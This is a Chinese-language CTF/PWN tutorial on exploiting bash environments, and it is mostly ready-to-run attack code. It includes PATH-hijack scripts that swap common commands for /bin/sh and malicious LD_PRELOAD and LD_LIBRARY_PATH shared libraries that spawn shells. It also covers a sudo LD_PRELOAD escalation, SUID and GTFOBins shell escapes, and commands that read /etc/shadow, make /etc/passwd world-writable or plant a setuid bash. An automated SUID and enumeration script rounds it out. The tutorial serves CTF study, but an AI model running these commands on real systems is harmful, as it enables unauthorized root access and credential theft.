# PWN题中的bash环境利用

## 概述

PWN题中经常需要利用bash环境特性来获取shell或提权。本文详细介绍环境变量注入、PATH劫持、LD_PRELOAD利用、SUID利用和GTFOBins技巧。

## 核心理念

- **环境变量控制**：通过环境变量影响程序行为
- **路径劫持**：利用PATH顺序执行恶意程序
- **库注入**：通过LD_PRELOAD加载恶意共享库
- **权限提升**：利用SUID和sudo配置提权

---

## 1. 环境变量注入

### 1.1 环境变量基础

```bash
# 查看所有环境变量
env
printenv
cat /proc/self/environ | tr '\0' '\n'

# 设置环境变量
export MY_VAR="value"
MY_VAR="value"

# 删除环境变量
unset MY_VAR
```

### 1.2 环境变量注入攻击

```bash
# 利用环境变量执行代码
# 如果程序读取 MY_VAR 并执行
export MY_VAR="malicious_code"
./vulnerable_program

# 利用环境变量注入shellcode
export PAYLOAD=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 100)')
./vulnerable_program

# 利用环境变量覆盖返回地址
# 需要找到环境变量在内存中的位置
env -i PAYLOAD=$(python3 -c 'print("A" * 1000)') ./vulnerable_program
```

### 1.3 环境变量与函数

```bash
# 利用函数覆盖
malicious_function() {
    echo "function executed"
    /bin/sh
}
export -f malicious_function
./vulnerable_program

# 利用函数定义在命令之前
function ls() { /bin/sh; }
ls
```

---

## 2. PATH劫持

### 2.1 PATH基础

```bash
# 查看当前PATH
echo $PATH
echo "$PATH" | tr ':' '\n'

# 临时修改PATH
export PATH="/tmp:$PATH"

# 永久修改PATH
echo 'export PATH="/tmp:$PATH"' >> ~/.bashrc
```

### 2.2 PATH劫持攻击

```bash
# 创建恶意程序
cat > /tmp/ls << 'EOF'
#!/bin/bash
echo "[*] PATH劫持成功"
/bin/sh
EOF
chmod +x /tmp/ls

# 劫持PATH
export PATH="/tmp:$PATH"
ls  # 执行恶意程序

# 劫持常用命令
for cmd in ls cat id whoami; do
    cat > /tmp/$cmd << 'SCRIPT'
#!/bin/bash
echo "[*] 命令被劫持"
/bin/sh
SCRIPT
    chmod +x /tmp/$cmd
done
```

### 2.3 自动PATH劫持

```bash
# 自动检测并劫持
auto_hijack() {
    local target_cmd="$1"
    local hijack_cmd="$2"

    # 找到目标命令位置
    local target_path
    target_path=$(which "$target_cmd" 2>/dev/null)

    if [[ -n "$target_path" ]]; then
        # 创建劫持脚本
        cat > "/tmp/$target_cmd" << EOF
#!/bin/bash
echo "[*] $target_cmd 被劫持"
$hijack_cmd
EOF
        chmod +x "/tmp/$target_cmd"
        export PATH="/tmp:$PATH"
        echo "[+] PATH劫持已设置: $target_cmd"
    fi
}
```

---

## 3. LD_PRELOAD利用

### 3.1 LD_PRELOAD基础

```bash
# 查看当前LD_PRELOAD
echo $LD_PRELOAD

# 设置LD_PRELOAD
export LD_PRELOAD=/tmp/malicious.so

# 使用LD_PRELOAD运行程序
LD_PRELOAD=/tmp/malicious.so ./program
```

### 3.2 创建恶意共享库

```bash
# 创建恶意C代码
cat > /tmp/malicious.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 恶意构造函数，在程序启动时执行
__attribute__((constructor))
void init() {
    unsetenv("LD_PRELOAD");
    system("/bin/sh");
}

// 恶意覆盖函数
int printf(const char *format, ...) {
    unsetenv("LD_PRELOAD");
    system("/bin/sh");
    return 0;
}
EOF

# 编译为共享库
gcc -shared -fPIC -o /tmp/malicious.so /tmp/malicious.c -nostartfiles
```

### 3.3 LD_PRELOAD利用场景

```bash
# 利用sudo的LD_PRELOAD漏洞
# 如果sudo配置了env_keep+=LD_PRELOAD
# 可以设置LD_PRELOAD指向恶意库

# 检查sudo配置
sudo -l

# 如果允许LD_PRELOAD
cat > /tmp/evil.c << 'EOF'
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    system("/bin/sh");
}
EOF
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c -nostartfiles
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/vim
```

### 3.4 LD_LIBRARY_PATH

```bash
# 类似LD_PRELOAD，但优先级较低
export LD_LIBRARY_PATH="/tmp:$LD_LIBRARY_PATH"

# 创建恶意共享库
cat > /tmp/libcrypto.c << 'EOF'
#include <stdlib.h>
__attribute__((constructor))
void init() {
    system("/bin/sh");
}
EOF
gcc -shared -fPIC -o /tmp/libcrypto.so /tmp/libcrypto.c -nostartfiles
```

---

## 4. SUID利用

### 4.1 SUID基础

```bash
# 查找SUID文件
find / -perm -4000 -type f 2>/dev/null

# 查找SGID文件
find / -perm -2000 -type f 2>/dev/null

# 查找可写文件
find / -writable -type f 2>/dev/null

# 查找可执行文件
find / -executable -type f 2>/dev/null
```

### 4.2 常见SUID利用

```bash
# SUID vim
vim -c ':!/bin/sh'

# SUID find
find . -exec /bin/sh \; -quit
find / -exec /bin/sh \; -quit

# SUID bash
bash -p

# SUID python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# SUID perl
perl -e 'exec "/bin/sh";'

# SUID ruby
ruby -e 'exec "/bin/sh"'
```

### 4.3 自动SUID提权

```bash
#!/usr/bin/env bash
# 自动SUID提权脚本

echo "[*] 搜索SUID文件..."
find / -perm -4000 -type f 2>/dev/null | while read suid_file; do
    echo "[+] 找到: $suid_file"

    case "$suid_file" in
        *vim*)
            echo "  -> vim -c ':!/bin/sh'"
            ;;
        *find*)
            echo "  -> find . -exec /bin/sh \\-quit"
            ;;
        *bash*)
            echo "  -> bash -p"
            ;;
        *python*)
            echo "  -> python -c 'import os; os.execl("/bin/sh", "sh", "-p")'"
            ;;
        *perl*)
            echo "  -> perl -e 'exec "/bin/sh";'"
            ;;
    esac
done
```

---

## 5. GTFOBins

### 5.1 GTFOBins利用

GTFOBins是一个收集可用于提权的Unix二进制文件的列表。

```bash
# 常见GTFOBins利用
# https://gtfobins.github.io/

# bash 提权
bash -p

# cat 读取文件
cat /etc/shadow

# chmod 修改权限
chmod 777 /etc/passwd

# cp 复制文件
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash

# find 执行命令
find / -exec /bin/sh \; -quit

# less 查看文件
less /etc/passwd
!/bin/sh

# more 查看文件
more /etc/passwd
!/bin/sh

# vim 编辑文件
vim -c ':!/bin/sh'

# python 执行代码
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl 执行代码
perl -e 'exec "/bin/sh";'

# ruby 执行代码
ruby -e 'exec "/bin/sh"'

# env 执行命令
env /bin/sh

# awk 执行代码
awk 'BEGIN {system("/bin/sh")}'

# nmap 交互模式
nmap --interactive
!sh

# man 查看手册
man man
!/bin/sh

# ftp 交互模式
ftp
!/bin/sh

# socat 交互模式
socat stdin exec:/bin/sh
```

### 5.2 自动GTFOBins搜索

```bash
#!/usr/bin/env bash
# 自动GTFOBins搜索脚本

GTFOBINS_URL="https://gtfobins.github.io"

search_gtfo() {
    local program="$1"
    echo "[*] 搜索 GTFOBins: $program"

    # 下载GTFOBins数据
    curl -s "${GTFOBINS_URL}/#${program}" | \
        grep -oP '<code[^>]*>[^<]+</code>' | \
        sed 's/<[^>]*>//g' | \
        head -5
}

# 检查系统上可用的GTFOBins
check_system_gtfo() {
    echo "[*] 检查系统上可用的GTFOBins..."

    local gtfo_bins=(
        "bash" "cat" "chmod" "cp" "find" "less" "more" "vim"
        "python" "perl" "ruby" "env" "awk" "nmap" "man" "ftp" "socat"
    )

    for bin in "${gtfo_bins[@]}"; do
        if command -v "$bin" &>/dev/null; then
            echo "[+] $bin: $(which $bin)"
        fi
    done
}
```

---

## 6. 综合利用脚本

```bash
#!/usr/bin/env bash
# PWN环境利用综合脚本

echo "[*] PWN环境利用工具"

# 1. 检查环境变量
echo "[*] 环境变量:"
env | head -20

# 2. 检查PATH
echo "[*] PATH:"
echo "$PATH" | tr ':' '\n'

# 3. 检查SUID
echo "[*] SUID文件:"
find / -perm -4000 -type f 2>/dev/null | head -20

# 4. 检查可写目录
echo "[*] 可写目录:"
find / -writable -type d 2>/dev/null | head -20

# 5. 检查sudo权限
echo "[*] sudo权限:"
sudo -l 2>/dev/null || echo "无法检查sudo权限"

# 6. 检查内核版本
echo "[*] 内核版本:"
uname -r

# 7. 检查网络
echo "[*] 网络接口:"
ip addr show 2>/dev/null || ifconfig 2>/dev/null
